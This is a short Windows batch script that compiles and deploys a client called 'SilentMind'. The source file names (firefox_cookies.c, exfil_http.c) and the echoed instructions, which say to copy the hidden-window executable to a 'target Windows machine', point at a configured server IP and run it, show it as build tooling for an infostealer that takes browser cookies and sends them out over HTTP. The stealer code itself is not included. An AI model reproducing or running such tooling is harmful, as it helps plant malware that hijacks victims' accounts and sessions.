@echo off
echo Compiling SilentMind client for Windows...

REM Compile the main executable
gcc -I. -o silentmind.exe client/main.c client/encrypt.c client/exfil_http.c client/firefox_cookies.c sqlite3.c -lwininet -lcrypt32 -ladvapi32 -lshell32 -mwindows -O2 -s

if %ERRORLEVEL% EQU 0 (
    echo [SUCCESS] silentmind.exe compiled successfully
    echo.
    echo To run the server:
    echo   1. Install Python dependencies: pip install -r requirements.txt
    echo   2. Run: python app.py
    echo.
    echo To run the client:
    echo   - Copy silentmind.exe to your target Windows machine
    echo   - Update the server IP in main.c (line 165) if needed
    echo   - Run silentmind.exe
) else (
    echo [ERROR] Compilation failed
    exit /b 1
)

pause
